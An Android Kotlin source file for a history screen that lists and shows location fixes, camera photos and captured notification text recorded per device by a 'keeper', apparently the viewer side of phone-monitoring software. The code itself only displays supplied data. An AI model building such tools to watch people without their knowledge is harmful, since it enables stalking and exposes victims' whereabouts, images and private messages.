// language: Kotlin, file: app/src/main/java/com/vivo/wirelink/HistoryActivity.kt
package com.vivo.wirelink

import android.content.Intent
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Bundle
import android.util.Base64
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.vivo.wirelink.databinding.ActivityHistoryBinding
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * HistoryEntry — one recorded event from the keeper.
 * Kinds: LOCATION, PHOTO, NOTIFICATION.
 */
data class HistoryEntry(
    val kind: Int,
    val ts: Long,
    val deviceId: String,
    val lat: Double = 0.0,
    val lng: Double = 0.0,
    val accuracy: Int = 0,
    val lens: String = "",
    val photoB64: String = "",
    val sizeBytes: Int = 0,
    val notifApp: String = "",
    val notifTitle: String = "",
    val notifText: String = ""
) {
    companion object {
        const val KIND_LOCATION = 1
        const val KIND_PHOTO = 2
        const val KIND_NOTIFICATION = 3
    }
}

class HistoryActivity : AppCompatActivity() {

    private lateinit var b: ActivityHistoryBinding
    private val adapter = HistoryAdapter { entry -> showDetail(entry) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        b = ActivityHistoryBinding.inflate(layoutInflater)
        setContentView(b.root)

        b.btnBack.setOnClickListener { finish() }

        b.rvHistory.layoutManager = LinearLayoutManager(this)
        b.rvHistory.adapter = adapter

        b.chipAll.setOnClickListener { applyFilter(0) }
        b.chipLoc.setOnClickListener { applyFilter(HistoryEntry.KIND_LOCATION) }
        b.chipCam.setOnClickListener { applyFilter(HistoryEntry.KIND_PHOTO) }
        b.chipNotif.setOnClickListener { applyFilter(HistoryEntry.KIND_NOTIFICATION) }

        applyFilter(0)
    }

    private var allEntries: List<HistoryEntry> = emptyList()
    private var currentFilter: Int = 0

    private fun applyFilter(kind: Int) {
        currentFilter = kind
        val cutoff = System.currentTimeMillis() - TWELVE_HOURS_MS
        val fresh = seed.filter { it.ts >= cutoff }

        allEntries = if (kind == 0) fresh else fresh.filter { it.kind == kind }

        // newest first
        val sorted = allEntries.sortedByDescending { it.ts }
        adapter.submit(sorted)

        b.tvEmpty.visibility = if (sorted.isEmpty()) View.VISIBLE else View.GONE
        b.tvCount.text = "${sorted.size} entries · last 12 h"

        // chip highlight (simple: text vs dim)
        val onColor = 0xFF000000.toInt()
        val offColor = 0xFF999999.toInt()
        b.chipAll.setTextColor(if (kind == 0) onColor else offColor)
        b.chipLoc.setTextColor(if (kind == HistoryEntry.KIND_LOCATION) onColor else offColor)
        b.chipCam.setTextColor(if (kind == HistoryEntry.KIND_PHOTO) onColor else offColor)
        b.chipNotif.setTextColor(if (kind == HistoryEntry.KIND_NOTIFICATION) onColor else offColor)
    }

    // ---------- detail views ----------

    private fun showDetail(entry: HistoryEntry) {
        when (entry.kind) {
            HistoryEntry.KIND_LOCATION -> showLocationDetail(entry)
            HistoryEntry.KIND_PHOTO    -> showPhotoDetail(entry)
            HistoryEntry.KIND_NOTIFICATION -> showNotificationDetail(entry)
        }
    }

    private fun showLocationDetail(entry: HistoryEntry) {
        val whenStr = fmt(entry.ts)
        val msg = "Device: ${entry.deviceId}\n" +
                  "Time: $whenStr\n" +
                  "Accuracy: ±${entry.accuracy} m\n" +
                  "Lat: ${entry.lat}\n" +
                  "Lng: ${entry.lng}"
        AlertDialog.Builder(this)
            .setTitle("Location")
            .setMessage(msg)
            .setPositiveButton("Open in maps") { _, _ -> openInMaps(entry.lat, entry.lng) }
            .setNegativeButton("Close", null)
            .show()
    }

    private fun showPhotoDetail(entry: HistoryEntry) {
        val bytes = try {
            Base64.decode(entry.photoB64, Base64.DEFAULT)
        } catch (t: Throwable) { null }
        val bmp = bytes?.let { BitmapFactory.decodeByteArray(it, 0, it.size) }
        if (bmp == null) {
            AlertDialog.Builder(this)
                .setTitle("Photo")
                .setMessage("Could not decode image.")
                .setPositiveButton("Close", null)
                .show()
            return
        }
        val iv = ImageView(this).apply {
            setImageBitmap(bmp)
            adjustViewBounds = true
            scaleType = ImageView.ScaleType.FIT_CENTER
            setPadding(24, 24, 24, 24)
        }
        AlertDialog.Builder(this)
            .setTitle("${entry.lens.ifEmpty { "camera" }} · ${entry.sizeBytes / 1024} KB · ${fmt(entry.ts)}")
            .setView(iv)
            .setPositiveButton("Close", null)
            .show()
    }

    private fun showNotificationDetail(entry: HistoryEntry) {
        val whenStr = fmt(entry.ts)
        val msg = "App: ${entry.notifApp}\n" +
                  "Time: $whenStr\n\n" +
                  "Title:\n${entry.notifTitle}\n\n" +
                  "Text:\n${entry.notifText}"
        AlertDialog.Builder(this)
            .setTitle("Notification")
            .setMessage(msg)
            .setPositiveButton("Close", null)
            .show()
    }

    private fun openInMaps(lat: Double, lng: Double) {
        val uri = Uri.parse("geo:$lat,$lng?q=$lat,$lng(Location)")
        val intent = Intent(Intent.ACTION_VIEW, uri)
        runCatching { startActivity(intent) }
    }

    private fun fmt(ts: Long): String =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(ts))

    // ---------- adapter ----------

    private class HistoryAdapter(
        val onClick: (HistoryEntry) -> Unit
    ) : RecyclerView.Adapter<HistoryAdapter.VH>() {

        private val items = mutableListOf<HistoryEntry>()
        private val df = SimpleDateFormat("HH:mm:ss", Locale.US)

        fun submit(list: List<HistoryEntry>) {
            items.clear()
            items.addAll(list)
            notifyDataSetChanged()
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): VH {
            val v = LayoutInflater.from(parent.context)
                .inflate(R.layout.item_history, parent, false)
            return VH(v)
        }

        override fun onBindViewHolder(holder: VH, position: Int) {
            val e = items[position]
            val (icon, label) = when (e.kind) {
                HistoryEntry.KIND_LOCATION -> "📍" to "location"
                HistoryEntry.KIND_PHOTO    -> "📸" to "${e.lens.ifEmpty { "camera" }} · ${e.sizeBytes / 1024} KB"
                HistoryEntry.KIND_NOTIFICATION -> "🔔" to "${e.notifApp} · ${e.notifTitle.ifEmpty { "notification" }}"
                else -> "•" to ""
            }
            holder.tvIcon.text = icon
            holder.tvLabel.text = label
            holder.tvTime.text = df.format(Date(e.ts))
            holder.itemView.setOnClickListener { onClick(e) }
        }

        override fun getItemCount() = items.size

        class VH(v: View) : RecyclerView.ViewHolder(v) {
            val tvIcon: TextView = v.findViewById(R.id.tvIcon)
            val tvLabel: TextView = v.findViewById(R.id.tvLabel)
            val tvTime: TextView = v.findViewById(R.id.tvTime)
        }
    }

    companion object {
        private const val TWELVE_HOURS_MS = 12L * 60L * 60L * 1000L

        @Volatile private var seed: List<HistoryEntry> = emptyList()

        fun seed(list: List<HistoryEntry>) {
            seed = list
        }
    }
}
